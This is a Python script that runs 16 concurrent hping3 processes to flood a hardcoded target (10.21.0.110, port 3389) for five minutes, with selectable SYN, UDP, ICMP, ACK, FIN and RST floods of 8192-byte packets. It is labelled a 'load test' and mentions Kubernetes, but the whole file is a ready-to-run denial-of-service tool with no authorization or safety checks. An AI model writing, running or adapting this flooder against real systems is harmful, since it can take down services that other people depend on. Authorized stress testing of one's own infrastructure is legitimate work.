import os
import signal
import subprocess
import sys
import threading
import time

from colorama import Fore, init

# Initialize colorama
init(autoreset=True)

# ---------------------------
# CONFIGURATION
# ---------------------------

TARGET_IP = "10.21.0.110"
TARGET_PORT = 3389
DURATION = 300  # seconds
THREADS = 16  # Number of concurrent hping processes
PACKET_SIZE = 8192  # Fixed packet size in bytes

# Hping attack types
ATTACK_TYPES = {
    "syn_flood": ["-S", "--flood"],
    "udp_flood": ["-2", "--flood"],
    "icmp_flood": ["-1", "--flood"],
    "ack_flood": ["-A", "--flood"],
    "fin_flood": ["-F", "--flood"],
    "rst_flood": ["-R", "--flood"],
}


def run_hping_worker(worker_id, attack_type, target_ip, port, duration, packet_size):
    """Run a single hping worker process"""

    # Build hping command
    cmd = ["hping3"]
    cmd.extend(ATTACK_TYPES[attack_type])
    cmd.extend(
        [
            "-p",
            str(port),
            "-d",
            str(packet_size),
        ]
    )
    cmd.append(target_ip)

    print(
        Fore.LIGHTCYAN_EX
        + f"[Worker-{worker_id}] Starting {attack_type} to {target_ip}:{port} with {packet_size}-byte packets"
    )
    print(Fore.YELLOW + f"[Worker-{worker_id}] Command: {' '.join(cmd)}")

    start_time = time.time()

    try:
        # Start hping process
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            preexec_fn=os.setsid,  # Create new process group
        )

        # Let it run for the specified duration
        time.sleep(duration)

        # Terminate the process group
        os.killpg(os.getpgid(process.pid), signal.SIGTERM)
        process.wait(timeout=5)

    except subprocess.TimeoutExpired:
        # Force kill if it doesn't terminate
        os.killpg(os.getpgid(process.pid), signal.SIGKILL)
        process.wait()
    except Exception as e:
        print(Fore.LIGHTRED_EX + f"[Worker-{worker_id}] Error: {str(e)}")

    elapsed = time.time() - start_time
    print(
        Fore.LIGHTMAGENTA_EX
        + f"[Worker-{worker_id}] Finished after {elapsed:.1f} seconds"
    )


def start_load_test(attack_type, target_ip, port, duration, num_threads, packet_size):
    """Start the load test with multiple hping workers"""

    print(Fore.LIGHTRED_EX + "🔥 HPING LOAD TEST STARTING 🔥")
    print(Fore.YELLOW + f"🎯 Target: {target_ip}:{port}")
    print(Fore.YELLOW + f"⚔️  Attack Type: {attack_type}")
    print(Fore.YELLOW + f"⏱️  Duration: {duration} seconds")
    print(Fore.YELLOW + f"🚀 Threads: {num_threads}")
    print(Fore.YELLOW + f"📦 Packet Size: {packet_size} bytes")

    if attack_type not in ATTACK_TYPES:
        print(Fore.LIGHTRED_EX + f"❌ Invalid attack type: {attack_type}")
        return

    print(Fore.LIGHTYELLOW_EX + "\nStarting in 3 seconds...")
    time.sleep(3)

    # Start worker threads
    threads = []
    for i in range(num_threads):
        t = threading.Thread(
            target=run_hping_worker,
            args=(i, attack_type, target_ip, port, duration, packet_size),
        )
        t.daemon = True
        t.start()
        threads.append(t)
        time.sleep(0.1)  # Slight delay between thread starts

    # Wait for all threads to complete
    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        print(Fore.LIGHTYELLOW_EX + "\n[!] Load test interrupted by user")

    print(Fore.LIGHTCYAN_EX + "\n💥 HPING LOAD TEST COMPLETE!")


def main():
    print(Fore.LIGHTRED_EX + "⚠️  WARNING: HPING LOAD TEST - HIGH INTENSITY ⚠️")
    print(Fore.LIGHTGREEN_EX + "\n🚀 HPING MULTI-THREADED LOAD TESTER")

    # Available attack types
    print(Fore.CYAN + "\nAvailable attack types:")
    for i, attack in enumerate(ATTACK_TYPES.keys(), 1):
        print(Fore.WHITE + f"  {i}. {attack}")

    # For Kubernetes, use predefined values (no interactive input)
    attack_type = "syn_flood"  # Change this as needed

    print(Fore.YELLOW + f"\n🎯 Target: {TARGET_IP}:{TARGET_PORT}")
    print(Fore.YELLOW + f"⚔️  Attack: {attack_type}")
    print(Fore.YELLOW + f"⏱️  Duration: {DURATION} seconds")
    print(Fore.YELLOW + f"🚀 Threads: {THREADS}")
    print(Fore.YELLOW + f"📦 Packet Size: {PACKET_SIZE} bytes")

    print(Fore.LIGHTRED_EX + "\nThis will launch multiple hping processes!")
    print(Fore.LIGHTYELLOW_EX + "Starting load test in 5 seconds...")
    time.sleep(5)

    # Start the load test
    start_load_test(attack_type, TARGET_IP, TARGET_PORT, DURATION, THREADS, PACKET_SIZE)


if __name__ == "__main__":
    main()
